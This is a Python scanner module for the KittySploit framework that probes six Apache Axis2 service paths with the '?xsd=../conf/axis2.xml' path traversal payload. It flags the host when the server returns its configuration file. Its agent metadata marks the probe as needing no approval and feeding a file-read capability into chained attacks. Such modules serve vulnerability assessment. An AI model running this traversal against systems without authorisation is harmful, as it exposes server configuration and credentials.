#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Axis2 ?xsd= path traversal to axis2.xml."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Axis2 - xsd Path Traversal Detection',
        'description': (
            'Detects Axis2 service ?xsd=../conf/axis2.xml traversal by matching '
            'axisconfig AxisJava2.0 in the response.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'axis2', 'apache', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 6,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.8,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.securityfocus.com/bid/40343',
        ],
    }

    def run(self):
        services = (
            '/axis2/services/Version',
            '/axis2/services/listServices',
            '/services/Version',
            '/axis/services/Version',
            '/axis2/services/AdminService',
            '/axis2/services/Echo',
        )
        for svc in services:
            path = f'{svc}?xsd=../conf/axis2.xml'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and 'axisconfig' in (r.text or '') and 'AxisJava2' in (r.text or ''):
                self.set_info(
                    severity='high',
                    reason='Axis2 xsd path traversal',
                    path=svc,
                )
                return True
        return False
